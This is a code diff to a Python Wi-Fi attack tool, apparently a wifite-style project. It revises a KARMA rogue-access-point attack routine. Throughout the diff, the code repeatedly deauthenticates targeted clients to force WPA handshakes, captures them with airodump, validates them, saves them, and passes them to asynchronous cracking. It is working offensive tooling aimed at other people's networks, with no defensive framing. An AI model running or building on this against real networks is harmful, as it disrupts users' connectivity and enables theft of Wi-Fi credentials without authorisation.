@@ -2503,7 +2503,7 @@ class AttackKARMA(Attack):
                     del self.active_capture_threads[client_mac]
     
     def async_capture_handshake_for_client(self, client_mac):
-        """Asynchronous handshake capture for a specific client - Fixed implementation"""
+        """Asynchronous handshake capture for a specific client - Fixed implementation matching WPA behavior"""
         try:
             # Update thread status
             if client_mac in self.active_capture_threads:
@@ -2517,78 +2517,94 @@ class AttackKARMA(Attack):
                 Color.pl('{!} {R}No AP found for client {O}%s{W}' % client_mac)
                 return
             
-            Color.pl('{+} {C}Targeting AP {G}%s{W} for client {G}%s{W}' % (ap_bssid, client_mac))
+            # Get the channel from target or real_networks
+            ap_channel = None
+            if hasattr(self, 'target') and self.target and hasattr(self.target, 'channel'):
+                ap_channel = self.target.channel
+            elif self.real_networks:
+                for network in self.real_networks:
+                    if hasattr(network, 'bssid') and network.bssid == ap_bssid:
+                        if hasattr(network, 'channel'):
+                            ap_channel = network.channel
+                            break
             
-            # Send deauth to trigger handshake (CRITICAL FIX)
-            self.trigger_handshake_with_deauth(ap_bssid, client_mac)
-            
-            # Wait a moment for deauth to take effect
-            time.sleep(2)
+            Color.pl('{+} {C}Targeting AP {G}%s{W} on channel {G}%s{W} for client {G}%s{W}' % (ap_bssid, ap_channel or 'auto', client_mac))
             
             # Use safe interface operation for airodump
             def capture_operation():
                 with Airodump(interface=self.probe_interface,
                              target_bssid=ap_bssid,  # FIXED: Use AP BSSID, not client MAC
+                             channel=ap_channel,  # FIXED: Add channel for better reliability
                              output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
                              delete_existing_files=True) as airodump:
                     
-                    # Monitor for handshake with extended timeout and more aggressive approach
-                    timer = Timer(120)  # Increased timeout to 120 seconds for better success rate
+                    # Monitor for handshake with extended timeout matching WPA approach
+                    timeout = getattr(Configuration, 'wpa_attack_timeout', 60)
+                    if timeout <= 0:
+                        timeout = 120
+                    timer = Timer(timeout)
                     handshake_found = False
-                    last_check_time = time.time()
-                    deauth_attempts = 0
-                    max_deauth_attempts = 5  # Increased from 3 to 5 attempts
+                    last_handshake_check = 0
+                    last_deauth_check = 0
                     
-                    Color.pl('{+} {C}Starting handshake capture for {G}%s{W} (timeout: 120s){W}' % client_mac)
+                    # Deauth timer similar to WPA
+                    deauth_timeout = getattr(Configuration, 'wpa_deauth_timeout', 5)
+                    if deauth_timeout <= 0:
+                        deauth_timeout = 5
+                    deauth_timer = Timer(deauth_timeout)
+                    
+                    Color.pl('{+} {C}Starting handshake capture for {G}%s{W} (timeout: %ds){W}' % (client_mac, timeout))
                     
                     while not timer.ended() and not handshake_found and self.running:
-                        # Send additional deauth attempts every 15 seconds (reduced from 20)
-                        if deauth_attempts < max_deauth_attempts and (time.time() - last_check_time) > 15:
-                            Color.pl('{+} {C}Sending additional deauth to trigger handshake for {G}%s{W} (attempt %d/%d){W}' % 
-                                    (client_mac, deauth_attempts + 1, max_deauth_attempts))
-                            self.trigger_handshake_with_deauth(ap_bssid, client_mac)
-                            deauth_attempts += 1
-                            last_check_time = time.time()
-                        
-                        # Check if handshake was captured
-                        cap_files = airodump.find_files(endswith='.cap')
-                        if cap_files:
-                            # Use async validation to prevent blocking
-                            if self.validate_handshake_async(cap_files[0]):
-                                self.captured_handshakes[client_mac] = cap_files[0]
-                                Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
-                                handshake_found = True
-                                
-                                # Save handshake to permanent directory
-                                self.save_karma_handshake(cap_files[0], client_mac, ap_bssid)
-                                
-                                # Attempt to crack the handshake asynchronously
-                                self.crack_handshake_async(client_mac, cap_files[0])
-                            else:
-                                # Show progress if no valid handshake yet
-                                if Configuration.verbose > 1:
-                                    Color.pl('{+} {O}Checking for handshake in {C}%s{W}...' % cap_files[0])
-                        
-                        # Adaptive sleep based on activity
                         current_time = time.time()
-                        if current_time - last_check_time > 5:  # No activity for 5 seconds
-                            time.sleep(0.5)  # Check more frequently
-                        else:
-                            time.sleep(1)  # Normal check interval
                         
-                        last_check_time = current_time
+                        # Check for handshake every 2 seconds (matching WPA behavior)
+                        if current_time - last_handshake_check >= 2:
+                            last_handshake_check = current_time
+                            
+                            cap_files = airodump.find_files(endswith='.cap')
+                            if cap_files:
+                                cap_file = cap_files[0]
+                                # Use Handshake class for validation (same as WPA)
+                                try:
+                                    from ..model.handshake import Handshake
+                                    handshake = Handshake(capfile=cap_file, bssid=ap_bssid)
+                                    if handshake.has_handshake():
+                                        self.captured_handshakes[client_mac] = cap_file
+                                        Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
+                                        handshake_found = True
+                                        
+                                        # Save handshake to permanent directory
+                                        self.save_karma_handshake(cap_file, client_mac, ap_bssid)
+                                        
+                                        # Attempt to crack the handshake asynchronously
+                                        self.crack_handshake_async(client_mac, cap_file)
+                                except Exception as e:
+                                    if Configuration.verbose > 1:
+                                        Color.pl('{!} {R}Error checking handshake: {O}%s{W}' % str(e))
+                        
+                        # Send deauth periodically (matching WPA timing)
+                        if current_time - last_deauth_check >= deauth_timeout:
+                            last_deauth_check = current_time
+                            try:
+                                # Use Aireplay.deauth like WPA does
+                                Color.pl('{+} {C}Sending deauth to trigger handshake for {G}%s{W}...' % client_mac)
+                                Aireplay.deauth(target_bssid=ap_bssid, client_mac=client_mac, timeout=2)
+                            except Exception as e:
+                                if Configuration.verbose > 1:
+                                    Color.pl('{!} {R}Error sending deauth: {O}%s{W}' % str(e))
+                        
+                        time.sleep(1)  # Check interval (matching WPA)
                     
                     if not handshake_found:
-                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after 120 seconds' % client_mac)
-                        # Retry handshake capture after a delay
-                        self.retry_handshake_capture(client_mac)
+                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after %d seconds' % (client_mac, timeout))
                     
                     return handshake_found
             
-            # Execute capture operation safely with shorter operation name
+            # Execute capture operation safely
             handshake_found = self.safe_interface_operation(
                 self.probe_interface, 
-                'handshake_capture',  # Shorter name instead of including MAC
+                'handshake_capture',
                 capture_operation
             )
                     
